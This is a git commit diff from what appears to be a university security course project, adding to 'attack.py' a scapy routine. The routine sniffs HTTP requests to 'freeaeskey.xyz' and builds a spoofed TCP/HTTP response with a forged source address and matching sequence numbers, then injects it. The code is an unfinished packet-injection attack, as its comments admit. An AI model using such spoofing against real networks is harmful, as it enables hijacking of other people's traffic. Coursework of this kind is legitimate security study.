08254c59ac17dc071dbfcd3278c4ebd41898a4f1
Michael Yoshimura <miyo6032@colorado.edu>
2020-03-30 19:51:58 -0600

    First packet sending

--- Project 3/attack.py
+++ Project 3/attack.py
@@ -1,6 +1,11 @@
 #!/usr/bin/python3
 
 import scapy
+from scapy.layers.http import HTTPResponse, HTTPRequest
+import scapy.packet as packet
+import urllib.parse as parse
+from scapy.all import *
+from scapy.utils import *
 
 def inject_pkt(pkt):
     #import dnet
@@ -13,7 +18,53 @@ def inject_pkt(pkt):
 # edit this function to do your attack
 ######
 def handle_pkt(pkt):
-    pass
+    # The strategy is to try to make everything an HTTP request, and any packets
+    # that are not will be ignored.
+    http_packet = None
+    try:
+        http_packet = HTTPRequest(pkt)
+    except:
+        return # Not an HTTP request. Ignore the packet.
+
+    if http_packet.Host != None:
+        host = http_packet.Host.decode('iso-8859-1')
+
+        if host != 'freeaeskey.xyz':
+            return
+
+        ether = Ether(pkt)
+        ip_layer = ether[IP]
+        tcp_layer = ether[TCP]
+
+        source = ip_layer.src
+        destination = ip_layer.dst
+        time_to_live = ip_layer.ttl
+
+        print("Source: {}, Destination: {}, Time: {}".format(source, destination, time_to_live))
+
+        sequence_number = tcp_layer.seq
+        acknowledgement = tcp_layer.ack
+        source_port = tcp_layer.sport
+        dest_port = tcp_layer.dport
+        flags = tcp_layer.flags
+
+        print("Sequence Number: {}, Ack number: {}, Source port: {}, Destination port: {}".format(sequence_number, acknowledgement, source_port, dest_port))
+
+        spoof_http_layer = HTTPResponse()
+        
+        spoof_ack = sequence_number + len(spoof_http_layer)
+        spoof_ip_layer = IP(dst="1.2.3.4", src=destination, ttl=time_to_live)
+        spoof_tpc_layer = TCP(seq=acknowledgement, sport=dest_port, dport=source_port, ack=spoof_ack, flags=flags)
+
+        print("Content Length: {}".format(len(http_packet)))
+
+        # LEft off where we don't really know how to get wireshark to recognise the 
+        # http response as an http protocol
+
+        packet = spoof_ip_layer/spoof_tpc_layer/spoof_http_layer
+        print(packet.show())
+
+        inject_pkt(packet)
 
 def main():
     import socket
